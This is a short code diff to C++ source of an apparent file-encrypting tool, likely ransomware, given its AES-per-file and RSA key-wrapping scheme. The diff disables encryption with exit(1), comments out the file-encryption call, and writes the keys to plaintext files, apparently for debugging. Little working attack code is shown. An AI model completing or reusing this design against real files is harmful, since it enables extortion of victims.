@@ -37,13 +37,15 @@ void Encryptor::invokeDir(const std::string &path)
         // If --protect is enabled
         std::string aeskey = _aesEncryptor->getAESKey();
         std::string aesiv = _aesEncryptor->getAESIv();
+        //std::string aeskeyabc = "abc";
+        //std::string aesivabc = "def";
         butterfly::writeBinFile("AESKey.txt", aeskey.c_str(), static_cast<long>(aeskey.length()));
         butterfly::writeBinFile("AESIV.txt", aesiv.c_str(), static_cast<long>(aesiv.length()));
-
+        exit(1);
         for (auto &file: files)
         {
             LOG_TRACE("FILE: " << file);
-            encryptFileWithAES(file.string());
+            //encryptFileWithAES(file.string());
         }
 
         // Save the final AESKey.bin file
@@ -59,7 +61,7 @@ void Encryptor::encryptCPrivateRSA()
 {
     // Get the CPrivateRSA.pem file string
     std::string cPrivateRSAStr = _rsaEncryptorAESKey->getRSAPrivateKeyStr();
-
+    //writeBinFile("CPrivateRSA.pem", cPrivateRSAStr.c_str(), static_cast<long>(cPrivateRSAStr.length()));
     EVP_PKEY *cPrivateRSAPKey = _rsaEncryptorCPrivateRSA->getEvpPkey();
 
     try
